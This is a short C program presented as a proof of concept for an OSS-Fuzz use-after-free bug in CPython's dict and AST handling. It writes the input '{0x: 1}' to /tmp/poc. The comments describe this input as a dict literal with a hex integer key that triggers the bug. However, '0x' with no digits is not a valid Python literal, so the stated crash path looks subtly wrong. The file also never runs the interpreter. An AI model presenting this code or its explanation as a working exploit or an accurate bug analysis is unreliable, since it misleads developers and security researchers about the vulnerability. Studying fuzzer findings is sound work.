#include <stdio.h>
#include <stdlib.h>
#include <string.h>

/* PoC for oss-fuzz:368076875 */
/* Triggers: heap-use-after-free in _Py_IsImmortal (CPython dict/AST) */
/* Vuln class: use_after_free */

int main(void) {
    /* Craft a Python expression that triggers use-after-free in dict literal evaluation */
    /* The exact bytes: {0x7b, 0x30, 0x78, 0x3a, 0x20, 0x31, 0x7d} = "{0x: 1}" */
    /* This causes a dictionary literal with a hex integer key, triggering the bug */
    fprintf(fopen("/tmp/poc", "wb"), "%s", "{0x: 1}");
    return 0;
}